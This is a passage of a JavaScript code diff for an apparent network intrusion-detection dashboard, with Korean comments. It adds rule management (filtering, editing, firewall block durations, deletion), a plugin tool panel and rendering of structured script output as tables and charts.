+let defaultBlockSec = 300;                           // config.json 의 기본 차단 시간 (loadRules 가 서버 값으로 갱신)
+function fmtSpan(sec) {
+  const d = Math.floor(sec / 86400), h = Math.floor(sec % 86400 / 3600), m = Math.floor(sec % 3600 / 60), s = sec % 60;
+  return [d && `${d}일`, h && `${h}시간`, m && `${m}분`, s && `${s}초`].filter(Boolean).join(" ") || "0초";
+}
+const blockText = (r) => !r.block ? "알림만" : r.block_permanent ? "차단 · 영구" : `차단 · ${fmtSpan(r.block_duration_sec || defaultBlockSec)}`;
+
+// r: 기존 규칙(없으면 {}). 돌려주는 read() 는 규칙에 합칠 값({block, block_duration_sec | block_permanent})을 만든다.
+// 기간을 건드리지 않았으면 기존 값(없으면 기본값 사용)을 그대로 둬서, 열었다가 저장만 해도 '수정'으로 잡히지 않는다.
+function blockControls(r) {
+  const orig = r.block_duration_sec, sec = orig || defaultBlockSec;
+  let touched = false;
+  const sw = el("input", {type: "checkbox", role: "switch"}); sw.checked = !!r.block;
+  const swTxt = el("span", {class: "swtxt"});
+  const num = (v, max) => { const i = el("input", {class: "txt num", type: "number", min: "0", max: String(max)}); i.value = v; return i; };
+  const dd = num(Math.floor(sec / 86400), 3650), hh = num(Math.floor(sec % 86400 / 3600), 23), mm = num(Math.floor(sec % 3600 / 60), 59);
+  const perm = el("input", {type: "checkbox"}); perm.checked = !!r.block_permanent;
+  const unit = (i, t) => el("label", {}, i, " " + t);
+  const dur = el("div", {class: "blockdur"}, el("span", {class: "lbl"}, "차단 기간"),
+    el("div", {class: "dur"}, unit(dd, "일"), unit(hh, "시간"), unit(mm, "분"), el("label", {class: "chk"}, perm, " 영구 차단 (직접 해제할 때까지)")));
+  const sync = () => {
+    swTxt.textContent = "방화벽 차단 " + (sw.checked ? "켜짐" : "꺼짐");
+    dur.hidden = !sw.checked;
+    [dd, hh, mm].forEach((i) => { i.disabled = perm.checked; });
+  };
+  [dd, hh, mm, perm].forEach((i) => i.addEventListener("input", () => { touched = true; }));
+  sw.addEventListener("change", sync);
+  perm.addEventListener("change", sync);
+  sync();
+  const read = () => {
+    if (!sw.checked) return {block: false};
+    if (perm.checked) return {block: true, block_permanent: true};
+    if (!touched) return orig ? {block: true, block_duration_sec: orig} : {block: true};
+    const n = (i) => Math.max(0, parseInt(i.value, 10) || 0);
+    const total = n(dd) * 86400 + n(hh) * 3600 + n(mm) * 60;
+    if (total <= 0) throw new Error("차단 기간을 1분 이상으로 지정하거나 '영구 차단'을 체크하세요.");
+    return total === defaultBlockSec && !orig ? {block: true} : {block: true, block_duration_sec: total};
+  };
+  return {node: el("div", {class: "blockctl"}, el("label", {class: "switch"}, sw, el("span", {class: "slider"}), swTxt), dur), read};
+}
+
+const splitTags = (s) => s.split(/[\s,]+/).map((t) => t.replace(/^#+/, "")).filter(Boolean);   // "#a #b, c" -> ["a","b","c"]
+
+// 검색·정렬·필터: 3초마다 카드를 다시 그려도 입력값은 유지되고, 다시 그릴 때마다 같은 조건이 적용된다
+let ruleItems = [];
+const squash = (t) => String(t).toLowerCase().replace(/[\s_]+/g, "");
+const SEV_RANK = {critical: 3, warning: 2, info: 1};
+// 정렬 기준별 비교 (기본 방향: 글자순=가나다, 위험도순=높은 것 먼저, 차단 여부=차단 먼저, 상태=켜짐 먼저). 같으면 이름순
+const SORTS = {
+  name: (a, b) => 0,
+  sev: (a, b) => SEV_RANK[b.severity] - SEV_RANK[a.severity],
+  block: (a, b) => Number(b.block) - Number(a.block),
+  state: (a, b) => Number(b.enabled) - Number(a.enabled),
+};
+let ruleRev = false;
+let ruleTag = "";                                    // 태그 필터 (빈 값 = 전체)
+let ruleHits = {};                                   // 규칙 id -> {count, last}
+let ruleSig = "";                                    // 규칙 목록이 바뀌었는지 비교용 (그대로면 카드를 다시 만들지 않음)
+function ruleTagButton(t) {
+  return el("button", {class: "ptag" + (ruleTag === t ? " on" : ""), type: "button", title: "이 태그로 걸러 보기",
+    onclick: () => { ruleTag = ruleTag === t ? "" : t; drawRules(); }}, "#" + t);
+}
+function drawRules() {
+  const q = squash($("#ruleSearch").value), sev = $("#ruleSev").value, blk = $("#ruleBlock").value, st = $("#ruleState").value;
+  const allTags = [...new Set(ruleItems.flatMap((i) => i.rule.tags || []))].sort();
+  if (ruleTag && !allTags.includes(ruleTag)) ruleTag = "";
+  const tagBar = $("#ruleTags"); clear(tagBar);
+  allTags.forEach((t) => tagBar.append(ruleTagButton(t)));
+  if (ruleTag) tagBar.append(el("button", {class: "btn sm", type: "button", onclick: () => { ruleTag = ""; drawRules(); }}, "태그 해제"));
+  const shown = ruleItems.filter((i) =>
+    (!q || squash(i.rule.name).includes(q) || squash(i.rule.id).includes(q) || (i.rule.tags || []).some((t) => squash(t).includes(q))) &&   // 이름·ID·태그 중 하나라도 맞으면 표시
+    (!ruleTag || (i.rule.tags || []).includes(ruleTag)) &&
+    (!sev || i.rule.severity === sev) &&
+    (!blk || (blk === "block") === i.rule.block) &&
+    (!st || (st === "on") === i.rule.enabled));
+  const key = $("#ruleSort").value;
+  shown.sort((x, y) => (SORTS[key](x.rule, y.rule)) || x.rule.name.localeCompare(y.rule.name, "ko"));
+  if (ruleRev) shown.reverse();                      // 역순은 어떤 정렬 기준에도 적용
+  const fwTb = $("#ruleRows"), scTb = $("#scriptRuleRows");
+  clear(fwTb); clear(scTb);
+  const fwShown = shown.filter((i) => ruleGroup(i.rule) === "firewall");
+  const scShown = shown.filter((i) => ruleGroup(i.rule) === "script");
+  const fwTotal = ruleItems.filter((i) => ruleGroup(i.rule) === "firewall").length;
+  const scTotal = ruleItems.filter((i) => ruleGroup(i.rule) === "script").length;
+  if (!fwShown.length) fwTb.append(el("div", {class: "alert info"}, fwTotal ? "조건에 맞는 규칙이 없습니다." : "방화벽 방식 규칙이 없습니다."));
+  fwShown.forEach((i) => fwTb.append(i.card));
+  if (!scShown.length) scTb.append(el("div", {class: "alert info"}, scTotal ? "조건에 맞는 규칙이 없습니다." : "플러그인 방식 규칙이 없습니다."));
+  scShown.forEach((i) => scTb.append(i.card));
+  const active = [sev, blk, st].filter(Boolean).length;
+  $("#ruleFilterSummary").textContent = "🔽 필터" + (active ? ` (${active}개 적용 중)` : "");
+  $("#ruleRev").classList.toggle("on", ruleRev);
+  $("#ruleRev").setAttribute("aria-pressed", String(ruleRev));
+  $("#ruleCount").textContent = `${ruleItems.length}개 중 ${shown.length}개 표시`;
+}
+["#ruleSearch", "#ruleSort", "#ruleSev", "#ruleBlock", "#ruleState"].forEach((id) => $(id).addEventListener("input", drawRules));
+$("#ruleRev").addEventListener("click", () => { ruleRev = !ruleRev; drawRules(); });
+$("#ruleFilterReset").addEventListener("click", () => {
+  ["#ruleSearch", "#ruleSev", "#ruleBlock", "#ruleState"].forEach((id) => { $(id).value = ""; });
+  $("#ruleSort").value = "sev";                      // 정렬 기본값은 위험도순
+  ruleRev = false; ruleTag = "";
+  drawRules();
+});
+
+// 삭제 확인 창: 규칙의 모든 정보를 보여 주고, 켜져 있으면 비활성화 후 삭제된다고 알려 준다
+function confirmDelete(r) {
+  return new Promise((resolve) => {
+    const dlg = $("#delDialog"), body = $("#delBody");
+    clear(body);
+    const row = (k, v) => body.append(el("dt", {}, k), el("dd", {}, v));
+    row("규칙", `${r.name} (${r.id})`);
+    row("설명", r.description || "(없음)");
+    row("조건", condText(r));
+    row("위험도", RISK[r.severity] || r.severity);
+    row("차단 여부", r.block ? "방화벽 차단 · " + (r.block_permanent ? "영구" : fmtSpan(r.block_duration_sec || defaultBlockSec)) : "알림만 (차단 안 함)");
+    row("현재 상태", r.enabled ? "켜짐" : "꺼짐");
+    clear($("#delNotes"));
+    if (r.enabled) $("#delNotes").append(el("div", {class: "alert warning"}, "이 규칙은 지금 켜져 있습니다. 삭제하면 먼저 비활성화한 뒤 삭제합니다."));
+    if (BUILTIN_DETECTORS.includes(r.detector)) $("#delNotes").append(el("div", {class: "alert info"},
+      "기본 탐지기의 규칙입니다. 삭제하면 이 탐지가 꺼진 상태가 됩니다. (rules/ 에 같은 이름의 파일을 다시 넣으면 복구됩니다)"));
+    if (r.detector === "script") $("#delNotes").append(el("div", {class: "alert info"},
+      "플러그인 방식 규칙입니다. 규칙 삭제는 이 파일만 지우고, rules/ 에 둔 스크립트 파일 자체는 지우지 않습니다."));
+    const done = (ok) => { dlg.close(); resolve(ok); };
+    $("#delCancel").onclick = () => done(false);
+    $("#delOk").onclick = () => done(true);
+    dlg.oncancel = () => resolve(false);              // Esc 로 닫은 경우
+    dlg.showModal();
+  });
+}
+
+// 수정 창: id·탐지기 종류는 바꿀 수 없다. 저장하면 (바뀐 게 있을 때) 서버가 그 규칙을 꺼짐 상태로 만든다
+const PARAM_LABEL = {
+  window_sec: "기간(초)", distinct_ports: "서로 다른 포트 수", max_syn: "한 IP 의 SYN 수", global_max_syn: "전체 SYN 합계",
+  global_min_sources: "합계로 볼 최소 출발지 수", max_packets: "ping 수", max_attempts: "접속 시도 횟수", max_bytes: "전송량(바이트)", min_failures: "로그인 실패 횟수",
+};
+function editRule(r) {
+  const dlg = $("#editDialog"), box = $("#editFields"), msg = $("#editMsg");
+  clear(box); clear(msg); clear($("#editNotes"));
+  const get = {};                                     // 항목 이름 -> 값을 읽는 함수
+  const field = (name, label, input, read, wide) => {
+    get[name] = read;
+    box.append(el("label", {class: wide ? "wide" : ""}, label, input));
+  };
+  const text = (v, attrs) => { const i = el("input", {class: "txt", ...attrs}); i.value = v ?? ""; return i; };
+  const select = (opts, v) => { const s = el("select", {}, opts.map(([val, t]) => el("option", {value: val}, t))); s.value = v; return s; };
+  const num = (v, min) => text(v, {type: "number", min: String(min || 1)});
+  const checkbox = (v) => { const c = el("input", {type: "checkbox"}); c.checked = v; return c; };
+
+  box.append(el("div", {class: "wide idline"}, `ID: ${r.id}`, " · ", ruleKind(r)));
+  const iName = text(r.name, {maxlength: "60"});
+  const iDesc = el("textarea", {class: "txt desc", maxlength: "200", rows: "1"}); iDesc.value = r.description ?? "";   // 쓰는 만큼 늘어남 (저장은 한 줄)
+  field("name", "이름", iName, () => iName.value.trim() || r.id);
+  field("description", "설명", iDesc, () => iDesc.value.replace(/\s*\n\s*/g, " ").trim(), true);
+  const iTags = text((r.tags || []).map((t) => "#" + t).join(" "), {placeholder: "#포트스캔 #정찰 (공백·쉼표로 구분, 6개까지)"});
+  field("tags", "태그", iTags, () => splitTags(iTags.value), true);
+  const iSev = select([["info", "Low"], ["warning", "Medium"], ["critical", "Critical"]], r.severity);
+  field("severity", "위험도", iSev, () => iSev.value);
+  const NOTIFY_OPTS = [["", "기본 (위험도에 따름)"], ["on", "켜기"], ["off", "끄기"]];
+  const asOpt = (v) => (v === true ? "on" : v === false ? "off" : "");
+  const iPop = select(NOTIFY_OPTS, asOpt((r.notify || {}).popup)), iSnd = select(NOTIFY_OPTS, asOpt((r.notify || {}).sound));
+  const defText = () => `알림 기본값: ${RISK[iSev.value]} 는 ${alertText(DEFAULT_ALERT[iSev.value])}. 아래에서 따로 정하면 그 값이 먼저 적용됩니다.`;
+  const defLine = el("div", {class: "wide idline"}, defText());
+  iSev.addEventListener("change", () => { defLine.textContent = defText(); });
+  box.append(defLine, el("label", {}, "화면 팝업", iPop), el("label", {}, "소리", iSnd));
+  get.notify = () => {
+    const o = {};
+    if (iPop.value) o.popup = iPop.value === "on";
+    if (iSnd.value) o.sound = iSnd.value === "on";
+    return o;
+  };
+  if (r.detector !== "exfiltration") {               // 유출 규칙은 알림만 (차단 슬라이드 없음)
+    const bc = blockControls(r);
+    box.append(el("div", {class: "wide"}, bc.node));
+    get.__block = bc.read;                           // block / block_duration_sec / block_permanent 를 한꺼번에 돌려줌
+  }
+  if (r.detector === "custom") {
+    const iProto = select([["tcp", "tcp"], ["udp", "udp"], ["icmp", "icmp"], ["any", "any"]], r.protocol);
+    const iPorts = text(r.dst_ports.join(", "), {placeholder: "비우면 전체 (예: 23, 2323)"});
+    const iFlags = select([["syn", "새 연결 시도(SYN)만"], ["any", "모든 TCP 패킷"]], r.tcp_flags);
+    const iCount = num(r.count), iWin = num(r.window_sec);
+    const iDist = select([["none", "패킷 수"], ["dst_port", "서로 다른 포트 수"]], r.distinct);
+    field("protocol", "프로토콜", iProto, () => iProto.value);
+    field("dst_ports", "대상 포트 (쉼표로 구분)", iPorts, () => iPorts.value.split(/[\s,]+/).filter(Boolean).map(Number));
+    field("tcp_flags", "TCP 조건", iFlags, () => iFlags.value);
+    field("count", "횟수 (이 이상이면 탐지)", iCount, () => parseInt(iCount.value, 10));
+    field("window_sec", "기간(초)", iWin, () => parseInt(iWin.value, 10));
+    field("distinct", "세는 방법", iDist, () => iDist.value);
+  } else if (r.detector === "script") {
+    box.append(el("div", {class: "wide idline"}, `실행 명령: ${r.command.join(" ")} (바꿀 수 없습니다. 바꾸려면 새로 올려서 서버에서 승인하세요)`));
+    const iInterval = num(r.interval_sec, 5), iTimeout = num(r.timeout_sec, 1);
+    field("interval_sec", "실행 주기(초)", iInterval, () => parseInt(iInterval.value, 10));
+    field("timeout_sec", "시간 제한(초)", iTimeout, () => parseInt(iTimeout.value, 10));
+  } else {
+    Object.keys(PARAM_LABEL).filter((k) => k in r).forEach((k) => {
+      const i = num(r[k]);
+      field(k, PARAM_LABEL[k], i, () => parseInt(i.value, 10));
+    });
+    if ("ports" in r) {
+      const i = text(r.ports.join(", "));
+      field("ports", "감시할 포트 (쉼표로 구분)", i, () => i.value.split(/[\s,]+/).filter(Boolean).map(Number));
+    }
+  }
+  $("#editNotes").append(el("div", {class: "alert warning"}, r.enabled
+    ? "이 규칙은 지금 켜져 있습니다. 내용을 바꿔서 저장하면 충돌을 막기 위해 먼저 꺼짐 상태가 됩니다. 확인한 뒤 '켜기'를 눌러 주세요. (알림 설정만 바꾸면 켜진 상태 그대로입니다)"
+    : "이 규칙은 꺼져 있습니다. 저장해도 꺼진 상태로 유지되니, 확인한 뒤 '켜기'를 눌러 주세요."));
+
+  return new Promise((resolve) => {
+    $("#editCancel").onclick = () => { dlg.close(); resolve(null); };
+    dlg.oncancel = () => resolve(null);
+    $("#editForm").onsubmit = async (e) => {
+      e.preventDefault();
+      const rule = {};
+      try {
+        Object.entries(get).forEach(([k, f]) => { const v = f(); if (k === "__block") Object.assign(rule, v); else if (v !== undefined) rule[k] = v; });
+        const res = await api("/api/rules/update", "POST", {id: r.id, rule});
+        if (!res.ok) throw new Error(res.reason);
+        dlg.close(); resolve(res);
+      } catch (err) { alertBox(msg, "error", err.message); }
+    };
+    dlg.showModal();
+    autoGrow(iDesc);
+  });
+}
+
+async function loadRules() {
+  const [d, ch] = await Promise.all([api("/api/rules"), api("/api/rule_changes?limit=50")]);
+  showErrors($("#ruleErrors"), d.errors, "규칙 파일");
+  defaultBlockSec = d.default_block_sec || 300;
+  ruleHits = d.hits || {};
+  d.rules.forEach((r) => { ruleNames[r.id] = r.name; ruleNotify[r.id] = r.notify || {}; });
+  const logBox = $("#ruleLogBox");
+  const logBusy = selecting(logBox);
+  if (!logBusy) clear(logBox);
+
+  const call = async (path, body) => { try { return await api(path, "POST", body); } catch (e) { alert(e.message); } finally { ruleSig = ""; loadRules(); } };
+  const del = async (r) => {
+    if (!(await confirmDelete(r))) return;
+    const res = await call("/api/rules/delete", {id: r.id});
+    if (res && !res.ok) alert(res.reason);
+  };
+  const edit = async (r) => {
+    const res = await editRule(r);
+    if (!res) return;
+    alertBox($("#ruleNotice"), res.changed ? "success" : "info", !res.changed ? `'${r.name}' 은(는) 바뀐 내용이 없어 그대로 두었습니다.`
+      : res.kept_enabled ? `'${r.name}' 의 알림 설정을 바꿨습니다. 탐지 조건은 그대로라 상태도 그대로입니다.`
+      : res.was_enabled ? `'${r.name}' 이(가) 수정되었습니다. 충돌을 막기 위해 꺼짐 상태가 되었으니, 내용을 확인한 뒤 '켜기'를 눌러 주세요.`
+      : `'${r.name}' 이(가) 수정되었습니다. 꺼짐 상태 그대로입니다. 확인한 뒤 '켜기'를 눌러 주세요.`);
+    loadRules();
+  };
+  // 규칙 카드: 이름 밑에 #태그, 오른쪽에 ⚙(수정)·🗑️(삭제)·켜기/끄기 스위치
+  const ruleCard = (r) => {
+    const sw = el("input", {type: "checkbox", role: "switch"}); sw.checked = r.enabled;
+    sw.addEventListener("change", () => { sw.disabled = true; call("/api/rules/enable", {id: r.id, enabled: !r.enabled}); });
+    return el("div", {class: "pcard sev-" + r.severity + (r.enabled ? "" : " off")},
+      el("div", {class: "pc-head"}, el("div", {class: "pc-title", title: `${r.name} (${r.id})`}, r.name),
+        el("div", {class: "pc-acts"},
+          el("button", {class: "iconbtn", type: "button", title: "수정", onclick: () => edit(r)}, "⚙"),
+          el("button", {class: "iconbtn", type: "button", title: "삭제", onclick: () => del(r)}, "🗑️"),
+          el("label", {class: "switch", title: r.enabled ? "끄기" : "켜기"}, sw, el("span", {class: "slider"})))),
+      (r.tags || []).length ? el("div", {class: "ptags"}, r.tags.map(ruleTagButton)) : null,
+      el("p", {class: "pc-desc"}, r.description || "(설명 없음)"),
+      el("p", {class: "caption pc-cond"}, condText(r)),
+      el("div", {class: "pc-foot"}, el("span", {class: "tag sev-" + RISK[r.severity]}, RISK[r.severity]), el("span", {class: "tag"}, blockText(r)),
+        el("span", {class: "tag"}, ruleKind(r)),
+        // 알림은 따로 정한 항목만 보여 줌 (안 정했으면 위험도 기본값이라 표시하지 않음). 켜짐/꺼짐은 오른쪽 위 스위치가 보여 줌
+        ["popup", "sound"].filter((k) => k in (r.notify || {})).map((k) =>
+          el("span", {class: "tag", title: "이 규칙에만 따로 정한 알림 (⚙ 수정에서 바꿈)"}, `${k === "popup" ? "팝업" : "소리"} ${r.notify[k] ? "켬" : "끔"}`)),
+        el("span", {class: "tag"}, ruleHits[r.id] ? `탐지 ${ruleHits[r.id].count}회 · 마지막 ${fmtTime(ruleHits[r.id].last)}` : "아직 탐지 없음")));
+  };
+  const sig = JSON.stringify([d.rules, defaultBlockSec, ruleHits]);
+  if (sig !== ruleSig) {                               // 규칙이 그대로면 카드를 다시 만들지 않음 (클릭 중에 바뀌지 않게)
+    ruleSig = sig;
+    ruleItems = d.rules.map((r) => ({rule: r, card: ruleCard(r)}));
+    drawRules();
+  }
+
+  if (logBusy) return;
+  // 규칙 변경 기록 (탐지 로그·누적 통계와 별개)
+  const log = el("tbody", {});
+  if (!ch.changes.length) log.append(el("tr", {}, el("td", {colspan: 3}, "아직 규칙을 바꾼 기록이 없습니다.")));
+  ch.changes.forEach((c) => log.append(el("tr", {}, el("td", {}, fmtTime(c.timestamp)), el("td", {}, typeName(c.rule)), el("td", {}, c.detail))));
+  logBox.append(el("div", {class: "df"}, el("table", {}, el("thead", {}, el("tr", {},
+    el("th", {}, "시간"), el("th", {}, "규칙"), el("th", {}, "내용"))), log)));
+}
+
+// ── 도구(플러그인): 카드 격자 + #태그. 입력값·출력은 ⚙ 를 누르면 나오는 상세 창에서 ──
+let pluginData = [];                // 마지막으로 받은 목록
+let pluginSig = "";                 // 목록이 바뀌었는지 비교용 (그대로면 다시 그리지 않아 클릭 중에 카드가 바뀌지 않음)
+let toolTag = "";                   // 태그 필터 (빈 값 = 전체)
+let pdId = null, pdSig = "";        // 상세 창에 열려 있는 도구 id, 그 도구의 마지막으로 그린 상태
+let pdInputs = {};                  // 상세 창의 입력 칸 (이름 -> input)
+const RUN_STATUS = {done: "완료", failed: "실패", stopped: "중지됨", timeout: "시간 초과"};
+const statusText = (p) => p.running ? "실행 중" : p.last_run ? (RUN_STATUS[p.last_run.status] || p.last_run.status) : "";
+
+async function pluginAct(p, path, body) {
+  try { await api(`/api/plugins/${p.id}/${path}`, "POST", body); } catch (e) { alert(e.message); }
+  await loadPlugins(true).catch(() => {});
+}
+function tagButton(t) {
+  return el("button", {class: "ptag" + (toolTag === t ? " on" : ""), type: "button", title: "이 태그로 걸러 보기",
+    onclick: () => { toolTag = toolTag === t ? "" : t; drawTools(); }}, "#" + t);
+}
+function pluginCard(p) {
+  let ctl;
+  if (p.kind === "service") {         // 서비스형: 켜기/끄기 스위치 (입력값은 기본값으로 시작, 바꾸려면 ⚙)
+    const sw = el("input", {type: "checkbox", role: "switch"});
+    sw.checked = p.running;
+    sw.addEventListener("change", () => { sw.disabled = true; pluginAct(p, p.running ? "stop" : "run", p.running ? undefined : {params: {}}); });
+    ctl = el("label", {class: "switch", title: p.running ? "중지" : "시작"}, sw, el("span", {class: "slider"}));
+  } else if (p.running) {
+    ctl = el("button", {class: "btn sm", type: "button", onclick: () => pluginAct(p, "stop")}, "⏹ 중지");
+  } else {                            // 1회 실행형: 입력값이 있으면 상세 창에서 값을 넣고 실행
+    ctl = el("button", {class: "btn sm primary", type: "button",
+      onclick: async () => {                          // 결과가 보이도록 실행하면서 상세 창을 연다
+        if (!p.params.length) await pluginAct(p, "run", {params: {}});
+        openPlugin(p.id);
+      }}, p.params.length ? "▶ 실행…" : "▶ 실행");
+  }
+  const st = statusText(p);
+  return el("div", {class: "pcard"},
+    el("div", {class: "pc-head"}, el("div", {class: "pc-title", title: p.name}, p.name),
+      el("div", {class: "pc-acts"}, el("button", {class: "iconbtn", type: "button", title: "자세히 · 입력값 · 출력", onclick: () => openPlugin(p.id)}, "⚙"), ctl)),
+    (p.tags || []).length ? el("div", {class: "ptags"}, p.tags.map(tagButton)) : null,
+    el("p", {class: "pc-desc"}, p.description || "(설명 없음)"),
+    el("div", {class: "pc-foot"}, el("span", {class: "tag"}, p.kind === "service" ? "서비스" : "1회 실행"),
+      st ? el("span", {class: "tag" + (p.running ? " live" : "")}, st) : null));
+}
+function toolMatches(p) {
+  if (toolTag && !(p.tags || []).includes(toolTag)) return false;
+  const q = $("#toolSearch").value.trim().toLowerCase();
+  return !q || [p.name, p.id, p.description, ...(p.tags || [])].join(" ").toLowerCase().includes(q);
+}
+function drawTools() {
+  const all = [...new Set(pluginData.flatMap((p) => p.tags || []))].sort();
+  if (toolTag && !all.includes(toolTag)) toolTag = "";
+  const bar = $("#toolTags"); clear(bar);
+  all.forEach((t) => bar.append(tagButton(t)));
+  if (toolTag) bar.append(el("button", {class: "btn sm", type: "button", onclick: () => { toolTag = ""; drawTools(); }}, "태그 해제"));
+  const shown = pluginData.filter(toolMatches);
+  const list = $("#pluginList"); clear(list);
+  if (!pluginData.length) list.append(el("div", {class: "alert info"}, "plugins/ 폴더에 플러그인이 없습니다."));
+  else if (!shown.length) list.append(el("div", {class: "alert info"}, "조건에 맞는 도구가 없습니다."));
+  shown.forEach((p) => list.append(pluginCard(p)));
+  $("#toolCount").textContent = pluginData.length ? `${pluginData.length}개 중 ${shown.length}개 표시` : "";
+}
+$("#toolSearch").addEventListener("input", drawTools);
+
+function openPlugin(id) {
+  const p = pluginData.find((x) => x.id === id);
+  if (!p) return;
+  pdId = id; pdSig = ""; pdInputs = {};
+  $("#pdTitle").textContent = "⚙️ " + p.name;
+  const tags = $("#pdTags"); clear(tags);
+  (p.tags || []).forEach((t) => tags.append(el("span", {class: "ptag"}, "#" + t)));
+  $("#pdDesc").textContent = p.description || "";
+  const row = $("#pdParams"); clear(row);
+  p.params.forEach((s) => {
+    const inp = s.type === "choice"
+      ? el("select", {}, (s.choices || []).map((c) => el("option", {value: c}, c)))
+      : el("input", {class: "txt", type: s.type === "int" ? "number" : "text"});
+    if (s.default !== undefined) inp.value = s.default;
+    pdInputs[s.name] = inp;
+    row.append(el("label", {}, s.label, inp));
+  });
+  drawPluginDialog(p);
+  if (!$("#pluginDialog").open) $("#pluginDialog").showModal();
+}
+function drawPluginDialog(p) {
+  const sig = JSON.stringify([p.running, p.last_run]);
+  if (sig === pdSig) return;          // 바뀐 게 없으면 그대로 둠 (출력을 읽는 중에 스크롤이 튀지 않게)
+  pdSig = sig;
+  const acts = $("#pdActions"); clear(acts);
+  acts.append(p.running
+    ? el("button", {class: "btn", type: "button", onclick: () => pluginAct(p, "stop")}, "⏹ 중지")
+    : el("button", {class: "btn primary", type: "button",
+        onclick: () => pluginAct(p, "run", {params: Object.fromEntries(Object.entries(pdInputs).map(([k, v]) => [k, v.value]))})},
+        p.kind === "service" ? "▶ 시작" : "▶ 실행"));
+  $("#pdStatus").textContent = statusText(p);
+  const out = $("#pdOut"); clear(out);
+  if (p.last_run) out.append(guiOutput(p.last_run.output, "tool:" + p.id));
+}
+
+// ── 도구 결과 화면 표시: 스크립트가 "@gui {JSON}" 한 줄을 출력하면 표·그래프로 그린다 ──
+// 종류: metric(숫자 카드, max 가 있으면 막대), table(표), bars(가로 막대), chart(값을 계속 출력하면 쌓이는 그래프), alert(안내 상자)
+// 내용은 글자로만 넣고(HTML 해석 안 함) 크기를 제한한다. 형식이 틀린 줄은 원본 출력에 그대로 남는다.
+const GUI_LIMIT = {line: 20000, text: 200, rows: 200, cols: 12, items: 50, points: 60, alerts: 5};
+const gText = (v) => String(v == null ? "" : v).slice(0, GUI_LIMIT.text);
+const gNum = (v) => (typeof v === "number" && isFinite(v) ? v : null);
+function parseGui(lines) {
+  const blocks = new Map(), text = [];
+  let alerts = [];
+  lines.forEach((line) => {
+    if (!line.startsWith("@gui ") || line.length > GUI_LIMIT.line) return text.push(line);
+    let g;
+    try { g = JSON.parse(line.slice(5)); } catch (e) { return text.push(line); }
+    if (!g || typeof g !== "object") return text.push(line);
+    const key = g.type + ":" + gText(g.label || g.title);
+    if (g.type === "metric" && (gNum(g.value) !== null || typeof g.value === "string")) {
+      blocks.set(key, {type: "metric", label: gText(g.label), value: g.value, unit: gText(g.unit), max: gNum(g.max)});
+    } else if (g.type === "table" && Array.isArray(g.columns) && Array.isArray(g.rows)) {
+      const cols = g.columns.slice(0, GUI_LIMIT.cols).map(gText);
+      blocks.set(key, {type: "table", title: gText(g.title), columns: cols,
+        rows: g.rows.slice(0, GUI_LIMIT.rows).map((r) => (Array.isArray(r) ? r : []).slice(0, cols.length).map(gText)), more: Math.max(0, g.rows.length - GUI_LIMIT.rows)});
+    } else if (g.type === "bars" && Array.isArray(g.items)) {
+      blocks.set(key, {type: "bars", title: gText(g.title),
+        items: g.items.slice(0, GUI_LIMIT.items).filter((i) => Array.isArray(i) && gNum(i[1]) !== null).map((i) => [gText(i[0]), i[1]])});
+    } else if (g.type === "chart" && gNum(g.value) !== null) {
+      const old = blocks.get(key);
+      const pts = (old ? old.points : []).concat([g.value]).slice(-GUI_LIMIT.points);
+      blocks.set(key, {type: "chart", label: gText(g.label), unit: gText(g.unit), max: gNum(g.max), points: pts});   // 같은 키는 처음 나온 자리 유지
+    } else if (g.type === "alert" && g.text) {
+      alerts = alerts.concat([{level: ["info", "success", "warning", "error"].includes(g.level) ? g.level : "info", text: gText(g.text)}]).slice(-GUI_LIMIT.alerts);
+    } else text.push(line);
+  });
+  return {blocks, alerts, text};
+}
+const gFmt = (v, unit) => (typeof v === "number" ? (Number.isInteger(v) ? v.toLocaleString() : v.toLocaleString(undefined, {maximumFractionDigits: 2})) : gText(v)) + (unit ? " " + unit : "");
+function guiBlock(b) {
+  if (b.type === "metric") {
+    const pct = b.max && typeof b.value === "number" ? Math.max(0, Math.min(100, b.value / b.max * 100)) : null;
+    return el("div", {class: "metric gcard"}, el("div", {class: "label"}, b.label), el("div", {class: "value"}, gFmt(b.value, b.unit)),
+      pct === null ? null : el("div", {class: "gmeter", role: "img", "aria-label": `${b.label} ${Math.round(pct)}%`},
+        el("div", {class: "fill" + (pct >= 90 ? " hot" : ""), style: `width:${Math.max(1, pct)}%`})));
+  }
+  if (b.type === "table") return el("div", {class: "gwide"}, b.title ? el("h4", {}, b.title) : null,
+    el("div", {class: "df"}, el("table", {}, el("thead", {}, el("tr", {}, b.columns.map((c) => el("th", {}, c)))),
+      el("tbody", {}, b.rows.length ? b.rows.map((r) => el("tr", {}, r.map((c) => el("td", {}, c)))) : el("tr", {}, el("td", {colspan: b.columns.length || 1}, "(비어 있음)"))))),
+    b.more ? el("p", {class: "caption"}, `… ${b.more}줄 더 있음 (최대 ${GUI_LIMIT.rows}줄 표시)`) : null);
+  if (b.type === "bars") { const box = el("div", {}); hbars(box, b.items); return el("div", {class: "gwide"}, b.title ? el("h4", {}, b.title) : null, box); }
+  if (b.type === "chart") {
+    const top = b.max || Math.max(...b.points, 0) || 1, last = b.points[b.points.length - 1];
+    return el("div", {class: "gwide"}, el("h4", {}, `${b.label} — 지금 ${gFmt(last, b.unit)}`),
+      el("div", {class: "tchart gchart", role: "img", "aria-label": `${b.label} 최근 ${b.points.length}개 값, 마지막 ${gFmt(last, b.unit)}`},
+        b.points.map((v) => el("div", {class: "tcol", title: gFmt(v, b.unit)}, el("div", {class: "tbar", style: `height:${Math.max(1, Math.min(100, v / top * 100))}%`})))),
+      el("div", {class: "taxis"}, el("span", {}, `최근 ${b.points.length}개`), el("span", {}, `최대 ${gFmt(top, b.unit)}`)));
+  }
+  return null;
+}
+const guiRawOpen = new Set();          // "원본 출력" 을 펼쳐 둔 도구 (새 출력이 와서 다시 그려도 펼친 채로)
+function guiOutput(lines, key) {
+  const g = parseGui(lines || []);
+  const box = el("div", {});
+  const hasGui = g.blocks.size || g.alerts.length;
+  if (hasGui) {
+    g.alerts.forEach((a) => box.append(el("div", {class: "alert " + a.level}, a.text)));
+    const blocks = [...g.blocks.values()];
+    const metrics = blocks.filter((b) => b.type === "metric");
+    if (metrics.length) box.append(el("div", {class: "metrics gmetrics"}, metrics.map(guiBlock)));
+    blocks.filter((b) => b.type !== "metric").forEach((b) => box.append(guiBlock(b)));
+  }
+  const pre = el("pre", {}, g.text.join("\n") || "(출력 없음)");
+  if (hasGui) {
+    const det = el("details", {class: "expander"}, el("summary", {}, `📜 원본 출력 (${g.text.length}줄)`), pre);
+    if (key && guiRawOpen.has(key)) det.open = true;
